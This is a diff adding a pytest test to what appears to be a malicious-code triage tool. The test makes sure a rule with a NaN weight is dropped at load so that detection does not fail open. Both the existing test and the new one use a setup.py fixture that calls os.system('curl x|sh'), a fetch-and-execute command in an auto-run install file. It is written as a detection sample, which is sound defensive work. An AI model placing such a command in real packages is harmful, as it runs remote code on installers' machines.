@@ -155,3 +155,17 @@ def test_primitives_plus_autoexec_still_escalates():
     d.changed.append(_code("setup.py", ["import os", "os.system('curl x|sh')"]).changed[0])
     r = triage(d, Config(), RULES)
     assert any(fr.rule == "autoexec-location" for fr in r.fired_rules) and r.escalate
+
+
+def test_nan_weight_catch_all_rule_is_dropped_so_escalation_survives(tmp_path):
+    # A community catch-all with weight .nan would make every score NaN (NaN >= 40 is False) and fail
+    # detection open. It must be dropped at load, so a known-escalating diff still escalates.
+    import shutil
+    for p in Path("rules/community").glob("*.yaml"):
+        shutil.copy(p, tmp_path / p.name)
+    (tmp_path / "zz-nan.yaml").write_text(
+        "- id: nan-catch-all\n  applies_to: code\n  weight: .nan\n"
+        "  match: {not: {syntax_error: true}}\n")
+    rules = load_rules(tmp_path)
+    assert "nan-catch-all" not in {r.id for r in rules} and len(rules) == len(RULES)
+    assert triage(_code("setup.py", ["import os", "os.system('curl x|sh')"]), Config(), rules).escalate
